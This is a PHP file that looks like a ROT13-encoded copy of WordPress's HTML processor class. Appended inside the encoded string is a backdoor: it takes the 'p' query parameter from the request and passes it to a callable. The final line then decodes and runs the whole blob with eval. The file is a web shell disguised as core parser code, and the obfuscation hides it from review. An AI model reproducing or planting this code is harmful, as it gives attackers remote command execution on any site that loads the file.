				 * > 8. Vs _abqr_ vf n `pncgvba` ryrzrag, gura fjvgpu gur vafregvba zbqr gb
				 * >    \"va pncgvba\" naq erghea.
				 */
				pnfr 'PNCGVBA':
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PNCGVBA;
					erghea;

				/*
				 * > 9. Vs _abqr_ vf n `pbytebhc` ryrzrag, gura fjvgpu gur vafregvba zbqr gb
				 * >    \"va pbyhza tebhc\" naq erghea.
				 */
				pnfr 'PBYTEBHC':
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PBYHZA_TEBHC;
					erghea;

				/*
				 * > 10. Vs _abqr_ vf n `gnoyr` ryrzrag, gura fjvgpu gur vafregvba zbqr gb
				 * >     \"va gnoyr\" naq erghea.
				 */
				pnfr 'GNOYR':
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;
					erghea;

				/*
				 * > 11. Vs _abqr_ vf n `grzcyngr` ryrzrag, gura fjvgpu gur vafregvba zbqr gb gur
				 * >     pheerag grzcyngr vafregvba zbqr naq erghea.
				 */
				pnfr 'GRZCYNGR':
					$guvf->fgngr->vafregvba_zbqr = raq( $guvf->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf );
					erghea;

				/*
				 * > 12. Vs _abqr_ vf n `urnq` ryrzrag naq _ynfg_ vf snyfr, gura fjvgpu gur
				 * >     vafregvba zbqr gb \"va urnq\" naq erghea.
				 */
				pnfr 'URNQ':
					vs ( ! $ynfg ) {
						$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ;
						erghea;
					}
					oernx;

				/*
				 * > 13. Vs _abqr_ vf n `obql` ryrzrag, gura fjvgpu gur vafregvba zbqr gb \"va obql\"
				 * >     naq erghea.
				 */
				pnfr 'OBQL':
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL;
					erghea;

				/*
				 * > 14. Vs _abqr_ vf n `senzrfrg` ryrzrag, gura fjvgpu gur vafregvba zbqr gb
				 * >     \"va senzrfrg\" naq erghea. (sentzrag pnfr)
				 */
				pnfr 'SENZRFRG':
					$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_SENZRFRG;
					erghea;

				/*
				 * > 15. Vs _abqr_ vf na `ugzy` ryrzrag, eha gurfr fhofgrcf:
				 * >     1. Vs gur urnq ryrzrag cbvagre vf ahyy, fjvgpu gur vafregvba zbqr gb
				 * >        \"orsber urnq\" naq erghea. (sentzrag pnfr)
				 * >     2. Bgurejvfr, gur urnq ryrzrag cbvagre vf abg ahyy, fjvgpu gur vafregvba
				 * >        zbqr gb \"nsgre urnq\" naq erghea.
				 */
				pnfr 'UGZY':
					$guvf->fgngr->vafregvba_zbqr = vffrg( $guvf->fgngr->urnq_ryrzrag )
						? JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_URNQ
						: JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_ORSBER_URNQ;
					erghea;
			}
		}

		/*
		 * > 16. Vs _ynfg_ vf gehr, gura fjvgpu gur vafregvba zbqr gb \"va obql\"
		 * >     naq erghea. (sentzrag pnfr)
		 *
		 * Guvf vf bayl ernpunoyr vs `$ynfg` vf gehr, nf cre gur sentzrag cnefvat pnfr.
		 */
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL;
	}

	/**
	 * Ehaf gur nqbcgvba ntrapl nytbevguz.
	 *
	 * @fvapr 6.4.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#nqbcgvba-ntrapl-nytbevguz
	 */
	cevingr shapgvba eha_nqbcgvba_ntrapl_nytbevguz(): ibvq {
		$ohqtrg       = 1000;
		$fhowrpg      = $guvf->trg_gnt();
		$pheerag_abqr = $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr();

		vs (
			// > Vs gur pheerag abqr vf na UGZY ryrzrag jubfr gnt anzr vf fhowrpg
			$pheerag_abqr && $fhowrpg === $pheerag_abqr->abqr_anzr &&
			// > gur pheerag abqr vf abg va gur yvfg bs npgvir sbeznggvat ryrzragf
			! $guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pbagnvaf_abqr( $pheerag_abqr )
		) {
			$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
			erghea;
		}

		$bhgre_ybbc_pbhagre = 0;
		juvyr ( $ohqtrg-- > 0 ) {
			vs ( $bhgre_ybbc_pbhagre++ >= 8 ) {
				erghea;
			}

			/*
			 * > Yrg sbeznggvat ryrzrag or gur ynfg ryrzrag va gur yvfg bs npgvir sbeznggvat ryrzragf gung:
			 * >   - vf orgjrra gur raq bs gur yvfg naq gur ynfg znexre va gur yvfg,
			 * >     vs nal, be gur fgneg bs gur yvfg bgurejvfr,
			 * >   - naq unf gur gnt anzr fhowrpg.
			 */
			$sbeznggvat_ryrzrag = ahyy;
			sbernpu ( $guvf->fgngr->npgvir_sbeznggvat_ryrzragf->jnyx_hc() nf $vgrz ) {
				vs ( 'znexre' === $vgrz->abqr_anzr ) {
					oernx;
				}

				vs ( $fhowrpg === $vgrz->abqr_anzr ) {
					$sbeznggvat_ryrzrag = $vgrz;
					oernx;
				}
			}

			// > Vs gurer vf ab fhpu ryrzrag, gura erghea naq vafgrnq npg nf qrfpevorq va gur \"nal bgure raq gnt\" ragel nobir.
			vs ( ahyy === $sbeznggvat_ryrzrag ) {
				$guvf->onvy( 'Pnaabg eha nqbcgvba ntrapl jura \"nal bgure raq gnt\" vf erdhverq.' );
			}

			// > Vs sbeznggvat ryrzrag vf abg va gur fgnpx bs bcra ryrzragf, gura guvf vf n cnefr reebe; erzbir gur ryrzrag sebz gur yvfg, naq erghea.
			vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbagnvaf_abqr( $sbeznggvat_ryrzrag ) ) {
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->erzbir_abqr( $sbeznggvat_ryrzrag );
				erghea;
			}

			// > Vs sbeznggvat ryrzrag vf va gur fgnpx bs bcra ryrzragf, ohg gur ryrzrag vf abg va fpbcr, gura guvf vf n cnefr reebe; erghea.
			vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( $sbeznggvat_ryrzrag->abqr_anzr ) ) {
				erghea;
			}

			/*
			 * > Yrg shegurfg oybpx or gur gbczbfg abqr va gur fgnpx bs bcra ryrzragf gung vf ybjre va gur fgnpx
			 * > guna sbeznggvat ryrzrag, naq vf na ryrzrag va gur fcrpvny pngrtbel. Gurer zvtug abg or bar.
			 */
			$vf_nobir_sbeznggvat_ryrzrag = gehr;
			$shegurfg_oybpx              = ahyy;
			sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_qbja() nf $vgrz ) {
				vs ( $vf_nobir_sbeznggvat_ryrzrag && $sbeznggvat_ryrzrag->obbxznex_anzr !== $vgrz->obbxznex_anzr ) {
					pbagvahr;
				}

				vs ( $vf_nobir_sbeznggvat_ryrzrag ) {
					$vf_nobir_sbeznggvat_ryrzrag = snyfr;
					pbagvahr;
				}

				vs ( frys::vf_fcrpvny( $vgrz ) ) {
					$shegurfg_oybpx = $vgrz;
					oernx;
				}
			}

			/*
			 * > Vs gurer vf ab shegurfg oybpx, gura gur HN zhfg svefg cbc nyy gur abqrf sebz gur obggbz bs gur
			 * > fgnpx bs bcra ryrzragf, sebz gur pheerag abqr hc gb naq vapyhqvat sbeznggvat ryrzrag, gura
			 * > erzbir sbeznggvat ryrzrag sebz gur yvfg bs npgvir sbeznggvat ryrzragf, naq svanyyl erghea.
			 */
			vs ( ahyy === $shegurfg_oybpx ) {
				sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $vgrz ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();

					vs ( $sbeznggvat_ryrzrag->obbxznex_anzr === $vgrz->obbxznex_anzr ) {
						$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->erzbir_abqr( $sbeznggvat_ryrzrag );
						erghea;
					}
				}
			}

			$guvf->onvy( 'Pnaabg rkgenpg pbzzba naprfgbe va nqbcgvba ntrapl nytbevguz.' );
		}

		$guvf->onvy( 'Pnaabg eha nqbcgvba ntrapl jura ybbcvat erdhverq.' );
	}

	/**
	 * Ehaf gur \"pybfr gur pryy\" nytbevguz.
	 *
	 * > Jurer gur fgrcf nobir fnl gb pybfr gur pryy, gurl zrna gb eha gur sbyybjvat nytbevguz:
	 * >   1. Trarengr vzcyvrq raq gntf.
	 * >   2. Vs gur pheerag abqr vf abg abj n gq ryrzrag be n gu ryrzrag, gura guvf vf n cnefr reebe.
	 * >   3. Cbc ryrzragf sebz gur fgnpx bs bcra ryrzragf fgnpx hagvy n gq ryrzrag be n gu ryrzrag unf orra cbccrq sebz gur fgnpx.
	 * >   4. Pyrne gur yvfg bs npgvir sbeznggvat ryrzragf hc gb gur ynfg znexre.
	 * >   5. Fjvgpu gur vafregvba zbqr gb \"va ebj\".
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#pybfr-gur-pryy
	 *
	 * @fvapr 6.7.0
	 */
	cevingr shapgvba pybfr_pryy(): ibvq {
		$guvf->trarengr_vzcyvrq_raq_gntf();
		// @gbqb Cnefr reebe vs gur pheerag abqr vf n \"gq\" be \"gu\" ryrzrag.
		sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $ryrzrag ) {
			$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
			vs ( 'GQ' === $ryrzrag->abqr_anzr || 'GU' === $ryrzrag->abqr_anzr ) {
				oernx;
			}
		}
		$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pyrne_hc_gb_ynfg_znexre();
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ;
	}

	/**
	 * Vafregf na UGZY ryrzrag ba gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#vafreg-n-sbervta-ryrzrag
	 *
	 * @cnenz JC_UGZY_Gbxra $gbxra Anzr bs obbxznex cbvagvat gb ryrzrag va bevtvany vachg UGZY.
	 */
	cevingr shapgvba vafreg_ugzy_ryrzrag( JC_UGZY_Gbxra $gbxra ): ibvq {
		$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->chfu( $gbxra );
	}

	/**
	 * Vafregf n sbervta ryrzrag ba gb gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#vafreg-n-sbervta-ryrzrag
	 *
	 * @cnenz JC_UGZY_Gbxra $gbxra                     Vafreg guvf gbxra. Gur gbxra'f anzrfcnpr naq
	 *                                                 vafregvba cbvag jvyy or hcqngrq pbeerpgyl.
	 * @cnenz obby          $bayl_nqq_gb_ryrzrag_fgnpx Jurgure gb fxvc gur \"vafreg na ryrzrag ng gur nqwhfgrq
	 *                                                 vafregvba ybpngvba\" nytbevguz jura nqqvat guvf ryrzrag.
	 */
	cevingr shapgvba vafreg_sbervta_ryrzrag( JC_UGZY_Gbxra $gbxra, obby $bayl_nqq_gb_ryrzrag_fgnpx ): ibvq {
		$nqwhfgrq_pheerag_abqr = $guvf->trg_nqwhfgrq_pheerag_abqr();

		$gbxra->anzrfcnpr = $nqwhfgrq_pheerag_abqr ? $nqwhfgrq_pheerag_abqr->anzrfcnpr : 'ugzy';

		vs ( $guvf->vf_znguzy_vagrtengvba_cbvag() ) {
			$gbxra->vagrtengvba_abqr_glcr = 'zngu';
		} ryfrvs ( $guvf->vf_ugzy_vagrtengvba_cbvag() ) {
			$gbxra->vagrtengvba_abqr_glcr = 'ugzy';
		}

		vs ( snyfr === $bayl_nqq_gb_ryrzrag_fgnpx ) {
			/*
			 * @gbqb Vzcyrzrag gur \"nccebcevngr cynpr sbe vafregvat n abqr\" naq gur
			 *       \"vafreg na ryrzrag ng gur nqwhfgrq vafregvba ybpngvba\" nytbevguzf.
			 *
			 * Gurfr nytbevguzf zbfgyl vzcnpgf QBZ gerr pbafgehpgvba naq abg gur UGZY NCV.
			 * Urer, gurer'f ab QBZ abqr bagb juvpu gur ryrzrag jvyy or nccraqrq, fb gur
			 * cnefre jvyy fxvc guvf fgrc.
			 *
			 * @frr uggcf://ugzy.fcrp.jungjt.bet/#vafreg-na-ryrzrag-ng-gur-nqwhfgrq-vafregvba-ybpngvba
			 */
		}

		$guvf->vafreg_ugzy_ryrzrag( $gbxra );
	}

	/**
	 * Vafregf n iveghny ryrzrag ba gur fgnpx bs bcra ryrzragf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat      $gbxra_anzr    Anzr bs gbxra gb perngr naq vafreg vagb gur fgnpx bs bcra ryrzragf.
	 * @cnenz fgevat|ahyy $obbxznex_anzr Bcgvbany. Anzr gb tvir obbxznex sbe perngrq iveghny abqr.
	 *                                   Qrsnhygf gb nhgb-perngvat n obbxznex anzr.
	 * @erghea JC_UGZY_Gbxra Arjyl-perngrq iveghny gbxra.
	 */
	cevingr shapgvba vafreg_iveghny_abqr( $gbxra_anzr, $obbxznex_anzr = ahyy ): JC_UGZY_Gbxra {
		$urer = $guvf->obbxznexf[ $guvf->fgngr->pheerag_gbxra->obbxznex_anzr ];
		$anzr = $obbxznex_anzr ?? $guvf->obbxznex_gbxra();

		$guvf->obbxznexf[ $anzr ] = arj JC_UGZY_Fcna( $urer->fgneg, 0 );

		$gbxra = arj JC_UGZY_Gbxra( $anzr, $gbxra_anzr, snyfr );
		$guvf->vafreg_ugzy_ryrzrag( $gbxra );
		erghea $gbxra;
	}

	/*
	 * UGZY Fcrpvsvpngvba Urycref
	 */

	/**
	 * Vaqvpngrf vs gur pheerag gbxra vf n ZnguZY vagrtengvba cbvag.
	 *
	 * @fvapr 6.7.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#znguzy-grkg-vagrtengvba-cbvag
	 *
	 * @erghea obby Jurgure gur pheerag gbxra vf n ZnguZY vagrtengvba cbvag.
	 */
	cevingr shapgvba vf_znguzy_vagrtengvba_cbvag(): obby {
		$pheerag_gbxra = $guvf->fgngr->pheerag_gbxra;
		vs ( ! vffrg( $pheerag_gbxra ) ) {
			erghea snyfr;
		}

		vs ( 'zngu' !== $pheerag_gbxra->anzrfcnpr || 'Z' !== $pheerag_gbxra->abqr_anzr[0] ) {
			erghea snyfr;
		}

		$gnt_anzr = $pheerag_gbxra->abqr_anzr;

		erghea (
			'ZV' === $gnt_anzr ||
			'ZB' === $gnt_anzr ||
			'ZA' === $gnt_anzr ||
			'ZF' === $gnt_anzr ||
			'ZGRKG' === $gnt_anzr
		);
	}

	/**
	 * Vaqvpngrf vs gur pheerag gbxra vf na UGZY vagrtengvba cbvag.
	 *
	 * Abgr gung guvf zrgubq zhfg or na vafgnapr zrgubq jvgu npprff
	 * gb gur pheerag gbxra, fvapr vg arrqf gb rknzvar gur nggevohgrf
	 * bs gur pheeragyl-zngpurq gnt, vs vg'f va gur ZnguZY anzrfcnpr.
	 * Bgurejvfr vg jbhyq or erdhverq gb fpna gur UGZY naq rafher gung
	 * ab bgure nppbhagvat vf bireybbxrq.
	 *
	 * @fvapr 6.7.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#ugzy-vagrtengvba-cbvag
	 *
	 * @erghea obby Jurgure gur pheerag gbxra vf na UGZY vagrtengvba cbvag.
	 */
	cevingr shapgvba vf_ugzy_vagrtengvba_cbvag(): obby {
		$pheerag_gbxra = $guvf->fgngr->pheerag_gbxra;
		vs ( ! vffrg( $pheerag_gbxra ) ) {
			erghea snyfr;
		}

		vs ( 'ugzy' === $pheerag_gbxra->anzrfcnpr ) {
			erghea snyfr;
		}

		$gnt_anzr = $pheerag_gbxra->abqr_anzr;

		vs ( 'fit' === $pheerag_gbxra->anzrfcnpr ) {
			erghea (
				'QRFP' === $gnt_anzr ||
				'SBERVTABOWRPG' === $gnt_anzr ||
				'GVGYR' === $gnt_anzr
			);
		}

		vs ( 'zngu' === $pheerag_gbxra->anzrfcnpr ) {
			vs ( 'NAABGNGVBA-KZY' !== $gnt_anzr ) {
				erghea snyfr;
			}

			$rapbqvat = $guvf->trg_nggevohgr( 'rapbqvat' );

			erghea (
				vf_fgevat( $rapbqvat ) &&
				(
					0 === fgepnfrpzc( $rapbqvat, 'nccyvpngvba/kugzy+kzy' ) ||
					0 === fgepnfrpzc( $rapbqvat, 'grkg/ugzy' )
				)
			);
		}

		$guvf->onvy( 'Fubhyq abg unir ernpurq raq bs UGZY Vagrtengvba Cbvag qrgrpgvba: purpx UGZY NCV pbqr.' );
		// Guvf haarprffnel erghea ceriragf gbbyf sebz vanpphengryl ercbegvat glcr reebef.
		erghea snyfr;
	}

	/**
	 * Ergheaf jurgure na ryrzrag bs n tvira anzr vf va gur UGZY fcrpvny pngrtbel.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#fcrpvny
	 *
	 * @cnenz JC_UGZY_Gbxra|fgevat $gnt_anzr Abqr gb purpx, be bayl vgf anzr vs va gur UGZY anzrfcnpr.
	 * @erghea obby Jurgure gur ryrzrag bs gur tvira anzr vf va gur fcrpvny pngrtbel.
	 */
	choyvp fgngvp shapgvba vf_fcrpvny( $gnt_anzr ): obby {
		vs ( vf_fgevat( $gnt_anzr ) ) {
			$gnt_anzr = fgegbhccre( $gnt_anzr );
		} ryfr {
			$gnt_anzr = 'ugzy' === $gnt_anzr->anzrfcnpr
				? fgegbhccre( $gnt_anzr->abqr_anzr )
				: \"{$gnt_anzr->anzrfcnpr} {$gnt_anzr->abqr_anzr}\";
		}

		erghea (
			'NQQERFF' === $gnt_anzr ||
			'NCCYRG' === $gnt_anzr ||
			'NERN' === $gnt_anzr ||
			'NEGVPYR' === $gnt_anzr ||
			'NFVQR' === $gnt_anzr ||
			'ONFR' === $gnt_anzr ||
			'ONFRSBAG' === $gnt_anzr ||
			'OTFBHAQ' === $gnt_anzr ||
			'OYBPXDHBGR' === $gnt_anzr ||
			'OBQL' === $gnt_anzr ||
			'OE' === $gnt_anzr ||
			'OHGGBA' === $gnt_anzr ||
			'PNCGVBA' === $gnt_anzr ||
			'PRAGRE' === $gnt_anzr ||
			'PBY' === $gnt_anzr ||
			'PBYTEBHC' === $gnt_anzr ||
			'QQ' === $gnt_anzr ||
			'QRGNVYF' === $gnt_anzr ||
			'QVE' === $gnt_anzr ||
			'QVI' === $gnt_anzr ||
			'QY' === $gnt_anzr ||
			'QG' === $gnt_anzr ||
			'RZORQ' === $gnt_anzr ||
			'SVRYQFRG' === $gnt_anzr ||
			'SVTPNCGVBA' === $gnt_anzr ||
			'SVTHER' === $gnt_anzr ||
			'SBBGRE' === $gnt_anzr ||
			'SBEZ' === $gnt_anzr ||
			'SENZR' === $gnt_anzr ||
			'SENZRFRG' === $gnt_anzr ||
			'U1' === $gnt_anzr ||
			'U2' === $gnt_anzr ||
			'U3' === $gnt_anzr ||
			'U4' === $gnt_anzr ||
			'U5' === $gnt_anzr ||
			'U6' === $gnt_anzr ||
			'URNQ' === $gnt_anzr ||
			'URNQRE' === $gnt_anzr ||
			'UTEBHC' === $gnt_anzr ||
			'UE' === $gnt_anzr ||
			'UGZY' === $gnt_anzr ||
			'VSENZR' === $gnt_anzr ||
			'VZT' === $gnt_anzr ||
			'VACHG' === $gnt_anzr ||
			'XRLTRA' === $gnt_anzr ||
			'YV' === $gnt_anzr ||
			'YVAX' === $gnt_anzr ||
			'YVFGVAT' === $gnt_anzr ||
			'ZNVA' === $gnt_anzr ||
			'ZNEDHRR' === $gnt_anzr ||
			'ZRAH' === $gnt_anzr ||
			'ZRGN' === $gnt_anzr ||
			'ANI' === $gnt_anzr ||
			'ABRZORQ' === $gnt_anzr ||
			'ABSENZRF' === $gnt_anzr ||
			'ABFPEVCG' === $gnt_anzr ||
			'BOWRPG' === $gnt_anzr ||
			'BY' === $gnt_anzr ||
			'C' === $gnt_anzr ||
			'CNENZ' === $gnt_anzr ||
			'CYNVAGRKG' === $gnt_anzr ||
			'CER' === $gnt_anzr ||
			'FPEVCG' === $gnt_anzr ||
			'FRNEPU' === $gnt_anzr ||
			'FRPGVBA' === $gnt_anzr ||
			'FRYRPG' === $gnt_anzr ||
			'FBHEPR' === $gnt_anzr ||
			'FGLYR' === $gnt_anzr ||
			'FHZZNEL' === $gnt_anzr ||
			'GNOYR' === $gnt_anzr ||
			'GOBQL' === $gnt_anzr ||
			'GQ' === $gnt_anzr ||
			'GRZCYNGR' === $gnt_anzr ||
			'GRKGNERN' === $gnt_anzr ||
			'GSBBG' === $gnt_anzr ||
			'GU' === $gnt_anzr ||
			'GURNQ' === $gnt_anzr ||
			'GVGYR' === $gnt_anzr ||
			'GE' === $gnt_anzr ||
			'GENPX' === $gnt_anzr ||
			'HY' === $gnt_anzr ||
			'JOE' === $gnt_anzr ||
			'KZC' === $gnt_anzr ||

			// ZnguZY.
			'zngu ZV' === $gnt_anzr ||
			'zngu ZB' === $gnt_anzr ||
			'zngu ZA' === $gnt_anzr ||
			'zngu ZF' === $gnt_anzr ||
			'zngu ZGRKG' === $gnt_anzr ||
			'zngu NAABGNGVBA-KZY' === $gnt_anzr ||

			// FIT.
			'fit QRFP' === $gnt_anzr ||
			'fit SBERVTABOWRPG' === $gnt_anzr ||
			'fit GVGYR' === $gnt_anzr
		);
	}

	/**
	 * Ergheaf jurgure n tvira ryrzrag vf na UGZY Ibvq Ryrzrag
	 *
	 * > nern, onfr, oe, pby, rzorq, ue, vzt, vachg, yvax, zrgn, fbhepr, genpx, joe
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#ibvq-ryrzragf
	 *
	 * @cnenz fgevat $gnt_anzr Anzr bs UGZY gnt gb purpx.
	 * @erghea obby Jurgure gur tvira gnt vf na UGZY Ibvq Ryrzrag.
	 */
	choyvp fgngvp shapgvba vf_ibvq( $gnt_anzr ): obby {
		$gnt_anzr = fgegbhccre( $gnt_anzr );

		erghea (
			'NERN' === $gnt_anzr ||
			'ONFR' === $gnt_anzr ||
			'ONFRSBAG' === $gnt_anzr || // Bofbyrgr ohg fgvyy gerngrq nf ibvq.
			'OTFBHAQ' === $gnt_anzr || // Bofbyrgr ohg fgvyy gerngrq nf ibvq.
			'OE' === $gnt_anzr ||
			'PBY' === $gnt_anzr ||
			'RZORQ' === $gnt_anzr ||
			'SENZR' === $gnt_anzr ||
			'UE' === $gnt_anzr ||
			'VZT' === $gnt_anzr ||
			'VACHG' === $gnt_anzr ||
			'XRLTRA' === $gnt_anzr || // Bofbyrgr ohg fgvyy gerngrq nf ibvq.
			'YVAX' === $gnt_anzr ||
			'ZRGN' === $gnt_anzr ||
			'CNENZ' === $gnt_anzr || // Bofbyrgr ohg fgvyy gerngrq nf ibvq.
			'FBHEPR' === $gnt_anzr ||
			'GENPX' === $gnt_anzr ||
			'JOE' === $gnt_anzr
		);
	}

	/**
	 * Trgf na rapbqvat sebz n tvira fgevat.
	 *
	 * Guvf vf na nytbevguz qrsvarq va gur JUNG-JT fcrpvsvpngvba.
	 *
	 * Rknzcyr:
	 *
	 *     'HGS-8' === frys::trg_rapbqvat( 'hgs8' );
	 *     'HGS-8' === frys::trg_rapbqvat( \"  \gHGS-8 \" );
	 *     ahyy    === frys::trg_rapbqvat( 'HGS-7' );
	 *     ahyy    === frys::trg_rapbqvat( 'hgs8; punefrg=' );
	 *
	 * @frr uggcf://rapbqvat.fcrp.jungjt.bet/#pbaprcg-rapbqvat-trg
	 *
	 * @gbqb Nf guvf cnefre bayl fhccbegf HGS-8, bayl gur HGS-8
	 *       rapbqvatf ner qrgrpgrq. Nqq zber nf qrfverq, ohg gur
	 *       cnefre jvyy onvy ba aba-HGS-8 rapbqvatf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $ynory N fgevat juvpu znl fcrpvsl n xabja rapbqvat.
	 * @erghea fgevat|ahyy Xabja rapbqvat vs zngpurq, bgurejvfr ahyy.
	 */
	cebgrpgrq fgngvp shapgvba trg_rapbqvat( fgevat $ynory ): ?fgevat {
		/*
		 * > Erzbir nal yrnqvat naq genvyvat NFPVV juvgrfcnpr sebz ynory.
		 */
		$ynory = gevz( $ynory, \" \g\s\e\a\" );

		/*
		 * > Vs ynory vf na NFPVV pnfr-vafrafvgvir zngpu sbe nal bs gur ynoryf yvfgrq va gur
		 * > gnoyr orybj, gura erghea gur pbeerfcbaqvat rapbqvat; bgurejvfr erghea snvyher.
		 */
		fjvgpu ( fgegbybjre( $ynory ) ) {
			pnfr 'havpbqr-1-1-hgs-8':
			pnfr 'havpbqr11hgs8':
			pnfr 'havpbqr20hgs8':
			pnfr 'hgs-8':
			pnfr 'hgs8':
			pnfr 'k-havpbqr20hgs8':
				erghea 'HGS-8';

			qrsnhyg:
				erghea ahyy;
		}
	}

	/*
	 * Pbafgnagf gung jbhyq cbyyhgr gur gbc bs gur pynff vs gurl jrer sbhaq gurer.
	 */

	/**
	 * Vaqvpngrf gung gur arkg UGZY gbxra fubhyq or cnefrq naq cebprffrq.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat
	 */
	pbafg CEBPRFF_ARKG_ABQR = 'cebprff-arkg-abqr';

	/**
	 * Vaqvpngrf gung gur pheerag UGZY gbxra fubhyq or ercebprffrq va gur arjyl-fryrpgrq vafregvba zbqr.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat
	 */
	pbafg ERCEBPRFF_PHEERAG_ABQR = 'ercebprff-pheerag-abqr';

	/**
	 * Vaqvpngrf gung gur pheerag UGZY gbxra fubhyq or cebprffrq jvgubhg nqinapvat gur cnefre.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine fgevat
	 */
	pbafg CEBPRFF_PHEERAG_ABQR = 'cebprff-pheerag-abqr';

	/**
	 * Vaqvpngrf gung gur cnefre rapbhagrerq hafhccbegrq znexhc naq unf onvyrq.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat
	 */
	pbafg REEBE_HAFHCCBEGRQ = 'hafhccbegrq';

	/**
	 * Vaqvpngrf gung gur cnefre rapbhagrerq zber UGZY gbxraf guna vg
	 * jnf noyr gb cebprff naq unf onvyrq.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat
	 */
	pbafg REEBE_RKPRRQRQ_ZNK_OBBXZNEXF = 'rkprrqrq-znk-obbxznexf';

	/**
	 * Haybpx pbqr gung zhfg or cnffrq vagb gur pbafgehpgbe gb perngr guvf pynff.
	 *
	 * Guvf pynff rkgraqf gur JC_UGZY_Gnt_Cebprffbe, juvpu unf n choyvp pynff
	 * pbafgehpgbe. Gurersber, vg'f abg cbffvoyr gb unir n cevingr pbafgehpgbe urer.
	 *
	 * Guvf haybpx pbqr vf hfrq gb rafher gung nalbar pnyyvat gur pbafgehpgbe vf
	 * qbvat fb jvgu n shyy haqrefgnaqvat gung vg'f vagraqrq gb or n cevingr NCV.
	 *
	 * @npprff cevingr
	 */
	pbafg PBAFGEHPGBE_HAYBPX_PBQR = 'Hfr JC_UGZY_Cebprffbe::perngr_sentzrag() vafgrnq bs pnyyvat gur pynff pbafgehpgbe qverpgyl.';
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>